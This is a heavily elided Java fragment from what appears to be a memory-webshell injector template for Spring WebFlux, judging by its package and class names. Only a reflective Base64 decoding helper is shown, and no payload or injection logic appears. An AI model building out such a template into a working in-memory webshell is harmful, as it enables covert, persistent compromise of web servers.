package org.leo.jmg.mem.injectortpl.springwebflux;
...
public class SpringWebFluxHandlerFunctionInjector {
    ...
    public static byte[] decodeBase64(String base64Str) throws Exception {
        try {
            ...
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class)
                    .invoke(decoderClass.newInstance(), base64Str);
        }
    }
